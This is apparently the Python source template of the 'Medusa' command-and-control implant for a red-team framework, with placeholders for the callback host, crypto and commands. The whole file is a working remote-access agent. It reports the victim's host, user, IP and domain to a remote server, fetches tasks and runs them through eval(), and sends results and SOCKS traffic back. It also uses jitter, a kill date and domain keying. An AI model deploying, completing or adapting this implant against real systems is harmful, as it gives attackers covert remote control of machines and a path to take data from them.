import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
    def isJoinedToTheProvidedDomain(self):
        target_domain = self.agent_config["DomainCheck"]
        try:
            # For Windows systems, use NetGetJoinInformation for robust domain detection
            if os.name == 'nt':
                import ctypes
                from ctypes import wintypes, POINTER, byref
                
                # NetGetJoinInformation constants
                NetSetupUnknownStatus = 0
                NetSetupUnjoined = 1
                NetSetupWorkgroupName = 2
                NetSetupDomainName = 3
                
                # Load netapi32.dll
                netapi32 = ctypes.WinDLL('netapi32.dll')
                
                # Define NetGetJoinInformation function
                NetGetJoinInformation = netapi32.NetGetJoinInformation
                NetGetJoinInformation.argtypes = [
                    wintypes.LPCWSTR,  # lpServer
                    POINTER(wintypes.LPWSTR),  # lpNameBuffer
                    POINTER(wintypes.DWORD)   # BufferType
                ]
                NetGetJoinInformation.restype = wintypes.DWORD
                
                # Define NetApiBufferFree
                NetApiBufferFree = netapi32.NetApiBufferFree
                NetApiBufferFree.argtypes = [wintypes.LPVOID]
                NetApiBufferFree.restype = wintypes.DWORD
                
                # Call NetGetJoinInformation
                name_buffer = wintypes.LPWSTR()
                buffer_type = wintypes.DWORD()
                
                result = NetGetJoinInformation(
                    None,  # Local computer
                    byref(name_buffer),
                    byref(buffer_type)
                )
                
                if result == 0:  # NERR_Success
                    try:
                        # Check if system is domain-joined
                        if buffer_type.value == NetSetupDomainName:
                            # Get domain name
                            domain_name = ctypes.wstring_at(name_buffer).upper()
                            target_domain_upper = target_domain.upper()
                            
                            # Free the buffer
                            NetApiBufferFree(name_buffer)
                            
                            # Compare domain names
                            return domain_name == target_domain_upper
                        else:
                            # System is not domain-joined (workgroup or unknown)
                            NetApiBufferFree(name_buffer)
                            return False
                    except:
                        # Free buffer on error
                        try:
                            NetApiBufferFree(name_buffer)
                        except:
                            pass
                        return False
                else:
                    # NetGetJoinInformation failed, fallback to environment variables
                    pass
            
            # Linux/macOS domain detection methods
            if os.name == 'posix':
                import socket
                target_domain_upper = target_domain.upper()
                
                # Method 1: Check /etc/resolv.conf for domain/search directives
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        resolv_content = f.read().upper()
                        for line in resolv_content.split('\n'):
                            line = line.strip()
                            if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
                                domains = line.split()[1:]
                                for domain in domains:
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 2: Use socket.getfqdn() to get FQDN
                try:
                    fqdn = socket.getfqdn().upper()
                    if '.' in fqdn:
                        domain_part = '.'.join(fqdn.split('.')[1:])
                        if domain_part == target_domain_upper:
                            return True
                except:
                    pass
                
                # Method 3: Check /etc/hostname and /etc/hosts for domain info
                try:
                    with open('/etc/hostname', 'r') as f:
                        hostname = f.read().strip().upper()
                        if '.' in hostname:
                            domain_part = '.'.join(hostname.split('.')[1:])
                            if domain_part == target_domain_upper:
                                return True
                except:
                    pass
                
                # Method 4: Parse /etc/krb5.conf for Kerberos realm (domain-joined systems)
                try:
                    with open('/etc/krb5.conf', 'r') as f:
                        krb_content = f.read().upper()
                        for line in krb_content.split('\n'):
                            line = line.strip()
                            if 'DEFAULT_REALM' in line and '=' in line:
                                realm = line.split('=')[1].strip()
                                if realm == target_domain_upper:
                                    return True
                except:
                    pass
                
                # Method 5: Check /etc/sssd/sssd.conf for domain configuration
                try:
                    with open('/etc/sssd/sssd.conf', 'r') as f:
                        sssd_content = f.read().upper()
                        for line in sssd_content.split('\n'):
                            line = line.strip()
                            if line.startswith('[DOMAIN/') and line.endswith(']'):
                                domain = line[8:-1]  # Remove [domain/ and ]
                                if domain == target_domain_upper:
                                    return True
                except:
                    pass
                
                # Method 6: Check systemd-resolved configuration files
                try:
                    # Check systemd-resolved main config
                    with open('/etc/systemd/resolved.conf', 'r') as f:
                        resolved_content = f.read().upper()
                        for line in resolved_content.split('\n'):
                            line = line.strip()
                            if line.startswith('DOMAINS='):
                                domains = line.split('=')[1].split()
                                for domain in domains:
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 7: Check /etc/dhcp/dhclient.conf for domain settings
                try:
                    with open('/etc/dhcp/dhclient.conf', 'r') as f:
                        dhcp_content = f.read().upper()
                        for line in dhcp_content.split('\n'):
                            line = line.strip()
                            if 'DOMAIN-NAME' in line and '"' in line:
                                # Extract domain from quoted string
                                parts = line.split('"')
                                if len(parts) >= 2:
                                    domain = parts[1].strip()
                                    if domain == target_domain_upper:
                                        return True
                except:
                    pass
                
                # Method 8: macOS specific - check system configuration files
                if platform.system().upper() == 'DARWIN':
                    try:
                        # Check /etc/resolv.conf alternatives on macOS
                        with open('/var/run/resolv.conf', 'r') as f:
                            resolv_content = f.read().upper()
                            for line in resolv_content.split('\n'):
                                line = line.strip()
                                if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
                                    domains = line.split()[1:]
                                    for domain in domains:
                                        if domain == target_domain_upper:
                                            return True
                    except:
                        pass
                    
                    # Check macOS Directory Services configuration
                    try:
                        import plistlib
                        with open('/Library/Preferences/OpenDirectory/Configurations/Active Directory.plist', 'rb') as f:
                            plist_data = plistlib.load(f)
                            if 'domain name' in plist_data:
                                ad_domain = plist_data['domain name'].upper()
                                if ad_domain == target_domain_upper:
                                    return True
                    except:
                        pass
                
                # Method 9: Check network interface configuration files
                try:
                    import glob
                    # Check various network config locations
                    config_paths = [
                        '/etc/sysconfig/network-scripts/ifcfg-*',
                        '/etc/network/interfaces',
                        '/etc/netplan/*.yaml',
                        '/etc/netplan/*.yml'
                    ]
                    
                    for pattern in config_paths:
                        for config_file in glob.glob(pattern):
                            try:
                                with open(config_file, 'r') as f:
                                    content = f.read().upper()
                                    for line in content.split('\n'):
                                        line = line.strip()
                                        if any(keyword in line for keyword in ['DOMAIN', 'SEARCH_DOMAIN', 'DNS_DOMAIN']):
                                            if '=' in line:
                                                domain = line.split('=')[1].strip().strip('"\'')
                                                if domain == target_domain_upper:
                                                    return True
                            except:
                                continue
                except:
                    pass
                
                return False
            
            # Fallback method using environment variables (Windows)
            current_domain = os.environ.get('USERDOMAIN', '').upper()
            target_domain_upper = target_domain.upper()
            
            # Check if current domain matches target domain
            if current_domain == target_domain_upper:
                return True
                
            # Additional check using USERDNSDOMAIN for FQDN
            dns_domain = os.environ.get('USERDNSDOMAIN', '').upper()
            if dns_domain == target_domain_upper:
                return True
                
            return False
        except Exception:
            # If any error occurs, assume not joined to target domain
            return False
      
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        #CERTSKIP
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
            "DomainCheck": "#DOMAIN_CHECK_HERE",
        }
        if self.agent_config["DomainCheck"] != "":
            if not self.isJoinedToTheProvidedDomain():
                os._exit(0)
        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
